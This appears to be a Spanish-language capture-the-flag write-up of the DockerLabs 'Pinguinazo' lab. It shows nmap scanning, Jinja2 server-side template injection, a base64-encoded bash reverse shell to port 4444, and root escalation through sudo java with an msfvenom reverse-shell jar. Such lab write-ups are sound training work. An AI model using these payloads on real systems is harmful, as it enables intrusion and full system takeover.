---
title: DockerLabs - Pinguinazo
summary: "Write-up del laboratorio Pinguinazo de DockerLabs"
author: elcybercurioso
date: 2025-11-11
categories: [Post, DockerLabs]
tags: [fácil, ssti, rce, sudo, java]
media_subpath: "/assets/img/posts/dockerlabs_pinguinazo"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Pinguinazo]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
PORT     STATE SERVICE
5000/tcp open  upnp
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Pinguinazo]
└─$ nmap -sCV -p5000 172.17.0.2                         
PORT     STATE SERVICE VERSION
5000/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)
|_http-title: Pingu Flask Web
|_http-server-header: Werkzeug/3.0.1 Python/3.12.3
```

## análisis

Al acceder a la página principal del servidor web de la máquina, encontramos el siguiente formulario:

![Desktop View](/20251110220639.webp){: width="972" height="589" .shadow}

Tras rellenarlo y enviarlo, veremos que lo que hayamos indicado en el nombre se verá reflejado en la respuesta:

![Desktop View](/20251110220714.webp){: width="550" height="400" .shadow}

Dado que posiblemente sea vulnerable a un **SSTI** (Server-side Template Injection), probamos con payloads básicos:

![Desktop View](/20251110221053.webp){: width="390" height="240" .shadow}

Y vemos en la respuesta que efectivamente existe una vulnerabilidad SSTI, ya que ha realizado la operatoria que hemos indicado:

![Desktop View](/20251110221018.webp){: width="550" height="400" .shadow}

## acceso inicial (pinguinazo)

Tras probar con varios payloads que encontramos en el repositorio de GitHub de [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection), vemos que podemos ejecutar comandos con el siguiente:

{% raw %}
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
{% endraw %}

![Desktop View](/20251110221223.webp){: width="972" height="589" .shadow}

Para evitar conflictos a la hora de ejecutar comandos, codificamos en base64 el script que nos enviará una consola remota:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Pinguinazo]
└─$ echo '/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1' | base64
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4wLjEvNDQ0NCAwPiYxCg==
```

Y lo indicamos en el payload que vamos a usar para obtener la consola:

{% raw %}
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4wLjEvNDQ0NCAwPiYxCg== | base64 -d | bash').read() }}
```
{% endraw %}

Nos ponemos en escucha, y tras enviar el formulario con el payload, deberíamos haber obtenido una consola:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Pinguinazo]
└─$ nc -nlvp 4444              
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 55288
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
pinguinazo@8b9c14116de7:~$ whoami
whoami
pinguinazo
pinguinazo@8b9c14116de7:~$ hostname -I
hostname -I
172.17.0.2
```

Tratamos la TTY para obtener una consola completamente funcional:

```bash
pinguinazo@8b9c14116de7:~$ script -c bash /dev/null
script -c bash /dev/null
Script started, output log file is '/dev/null'.
pinguinazo@8b9c14116de7:~$ ^Z
zsh: suspended  nc -nlvp 4444

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Pinguinazo]
└─$ stty raw -echo;fg                  
[1]  + continued  nc -nlvp 4444
                               reset xterm
pinguinazo@8b9c14116de7:~$ export TERM=xterm
pinguinazo@8b9c14116de7:~$ export SHELL=bash
pinguinazo@8b9c14116de7:~$ stty rows 48 columns 210
```

## escalada de privilegios (root)

Revisando los permisos SUDO del usuario `pinguinazo`, vemos que puede ejecutar `/usr/bin/java` como el usuario `root`:

```bash
pinguinazo@8b9c14116de7:~$ sudo -l
Matching Defaults entries for pinguinazo on 8b9c14116de7:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User pinguinazo may run the following commands on 8b9c14116de7:
    (ALL) NOPASSWD: /usr/bin/java
```

En el siguiente [link](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-java-privilege-escalation) nos indican que podemos generar un fichero `.jar` malicioso, que al ejecutarse con `/usr/bin/java`, nos otorga una consola:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Pinguinazo]
└─$ msfvenom -p java/shell_reverse_tcp LHOST=172.17.0.1 LPORT=5555 -f jar -o shell.jar
Payload size: 7501 bytes
Final size of jar file: 7501 bytes
Saved as: shell.jar
```

Para pasar el fichero .jar a la máquina víctima, lo codificamos en base64:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Pinguinazo]
└─$ base64 shell.jar -w0
<cadena en base64>
```

Y en la máquina víctima lo decodificamos y lo guardamos nuevamente en un fichero .jar:

```bash
pinguinazo@8b9c14116de7:~$ echo "<cadena en base64>" | base64 -d > shell.jar
```

Procedemos a ejecutar el fichero .jar con SUDO:

```bash
pinguinazo@8b9c14116de7:~$ sudo /usr/bin/java -jar shell.jar
```

Si nos hemos puesto en escucha en nuestra máquina antes de ejecutar el script anterior, deberíamos haber obtenido una consola como el usuario `root` en la máquina víctima:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Pinguinazo]
└─$ nc -nlvp 5555              
listening on [any] 5555 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 39564
script -c bash /dev/null
Script started, output log file is '/dev/null'.
root@8b9c14116de7:/home/pinguinazo# whoami
whoami
root
root@8b9c14116de7:/home/pinguinazo# hostname -I
hostname -I
172.17.0.2
```



<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>